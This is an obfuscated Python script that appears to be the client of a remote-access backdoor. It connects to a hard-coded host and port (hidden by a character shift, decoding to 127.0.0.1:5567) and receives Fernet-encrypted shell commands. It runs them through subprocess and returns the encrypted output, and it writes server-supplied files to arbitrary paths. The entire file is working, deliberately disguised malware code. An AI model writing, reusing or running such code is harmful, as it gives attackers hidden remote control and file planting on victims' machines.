# Obfuscated with PyObfx #
import socket as sESrtFKPOijc
import  subprocess as KnMmIWtvfRJhuLderAOT
from cryptography.fernet import Fernet as FjEfPvLGNCbn

rmMOJGLwUb = lambda n: (n - (5 % 1)) - 5
QrqZYzBkhu = lambda s: ''.join(chr(int(rmMOJGLwUb(ord(c)))) for c in s)
VkbcApFS, evywZTbu = QrqZYzBkhu("67<353536"), int(rmMOJGLwUb(5572))

ie = sESrtFKPOijc.socket()
ie.connect((VkbcApFS, evywZTbu))

CWLoXtNGapDTeyAJZkzr = ''

BhpnDKlNmbJO = ""
while bool(int(rmMOJGLwUb(6))):
    BLZFJrCA = ie.recv(int(rmMOJGLwUb(1029)))
    if BLZFJrCA:
        if BLZFJrCA == b"{SERVER KEY}":
            BhpnDKlNmbJO = "{SERVER KEY}"
        elif BLZFJrCA == b"{ABORT}":
            ie.close()
            break
        elif BLZFJrCA == b"{COMMAND}":
            BhpnDKlNmbJO = "{COMMAND}"
        elif BLZFJrCA == b"{FILE}":
            BhpnDKlNmbJO = "{file}"
            continue
        if BhpnDKlNmbJO == "{SERVER KEY}":
            CWLoXtNGapDTeyAJZkzr = BLZFJrCA
        if BhpnDKlNmbJO == "{COMMAND}":
            mjLrAkNnWfgS = FjEfPvLGNCbn(CWLoXtNGapDTeyAJZkzr)
            GXCWTK = ie.recv(int(rmMOJGLwUb(1029)))
            sNgGLXQqEouZFfhdUzcDROkaWj = mjLrAkNnWfgS.decrypt(GXCWTK).decode()
            bvFwOyKGftIA = KnMmIWtvfRJhuLderAOT.getoutput(sNgGLXQqEouZFfhdUzcDROkaWj)
            OpPGKlEDyaizjQeSTHdgAXshmbYtFnvI = mjLrAkNnWfgS.encrypt(bvFwOyKGftIA.encode())
            ie.send(OpPGKlEDyaizjQeSTHdgAXshmbYtFnvI)
            BhpnDKlNmbJO = ""
        elif BhpnDKlNmbJO == "{file}":
            KjRJWONwulXEcdibSA = QrqZYzBkhu("AXJUJWFYTWC")
            vhzmOnyRbsVGaF = BLZFJrCA.decode()
            SjMNTzgEdVDXmu = vhzmOnyRbsVGaF.split(KjRJWONwulXEcdibSA)
            cxFlVHgPTeJBUtXK = SjMNTzgEdVDXmu[int(rmMOJGLwUb(5))]
            yczJofhIMmdTDLlX = SjMNTzgEdVDXmu[int(rmMOJGLwUb(6))]
            VigDbuURYKjsaqTOfmcIyl = SjMNTzgEdVDXmu[int(rmMOJGLwUb(7))]
            DEXfJBWzCRHvOPcxVK = int(yczJofhIMmdTDLlX)
            with open(VigDbuURYKjsaqTOfmcIyl, QrqZYzBkhu("|g")) as lP:
                while bool(int(rmMOJGLwUb(6))):
                    oKZymvnxEWdfXspzLQeD = ie.recv(int(rmMOJGLwUb(1029)) if DEXfJBWzCRHvOPcxVK > int(rmMOJGLwUb(1029)) else DEXfJBWzCRHvOPcxVK)
                    if oKZymvnxEWdfXspzLQeD == b"{END OF FILE}": 
                        break
                    lP.write(oKZymvnxEWdfXspzLQeD)
            BhpnDKlNmbJO = ""
